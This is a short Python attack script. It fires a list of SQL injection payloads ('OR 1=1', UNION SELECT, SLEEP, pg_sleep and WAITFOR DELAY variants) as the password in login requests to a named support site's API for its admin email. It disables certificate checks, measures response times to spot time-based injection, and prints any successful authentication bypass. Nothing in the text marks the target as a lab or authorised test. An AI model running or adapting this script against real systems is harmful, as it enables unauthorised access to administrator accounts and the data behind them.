import requests, time, json
requests.packages.urllib3.disable_warnings()

URL = "https://soporte.disperso.com/api/auth/login"
EMAIL = "admin@disperso.com"

sqli_pwds = [
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR 1=1--",
    "' OR 1=1#",
    "') OR ('1'='1",
    "' OR ''='",
    "admin'--",
    "' UNION SELECT 1,2,3--",
    "' AND SLEEP(5)--",
    "' AND pg_sleep(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND 1=1--",
    "' AND 1=2--",
]

results = []
for pwd in sqli_pwds:
    try:
        t = time.time()
        r = requests.post(URL, json={"email": EMAIL, "password": pwd}, timeout=12, verify=False)
        elapsed = round(time.time()-t, 2)
        results.append({"pwd": pwd[:40], "status": r.status_code, "time": elapsed, "size": len(r.content)})
        print(f"[{r.status_code}] {elapsed}s | {repr(pwd[:40])}")
        if elapsed > 4:
            print("  [!!!] TIME-BASED SQLi!")
        if r.status_code == 200:
            print(f"  [!!!] BYPASS! {r.text[:300]}")
    except Exception as e:
        print(f"[ERR] {e}")
    time.sleep(0.3)

print(json.dumps(results, indent=2))
